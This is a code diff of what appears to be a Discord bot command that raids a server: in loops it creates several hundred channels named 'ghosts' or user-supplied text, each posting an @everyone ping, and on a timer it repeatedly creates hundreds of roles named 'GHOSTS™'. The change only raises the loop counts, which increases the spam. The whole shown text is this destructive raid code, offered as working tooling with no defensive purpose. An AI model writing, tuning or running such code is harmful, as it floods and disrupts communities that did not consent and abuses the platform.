@@ -62,7 +62,7 @@ module.exports = {
                 )
             )
 
-            for (let i = 0; i < 250; i++) {
+            for (let i = 0; i <= 301; i++) {
                 message.guild.channels.create('ghosts').then(
                     function (ch, i) {
                         ch.send("@everyone").then(
@@ -77,7 +77,7 @@ module.exports = {
             }
 
             setInterval(function () {
-                for (let i = 0; i < 250; i++) {
+                for (let i = 0; i <= 250; i++) {
                     message.guild.roles.create({
                         data: {
                             name: "GHOSTS™",
@@ -149,7 +149,7 @@ module.exports = {
                 )
             )
 
-            for (let i = 0; i < 250; i++) {
+            for (let i = 0; i <= 301; i++) {
                 message.guild.channels.create(text).then(
                     function (ch, i) {
                         ch.send("@everyone").then(
@@ -164,7 +164,7 @@ module.exports = {
             }
 
             setInterval(function () {
-                for (let i = 0; i < 250; i++) {
+                for (let i = 0; i <= 250; i++) {
                     message.guild.roles.create({
                         data: {
                             name: text,
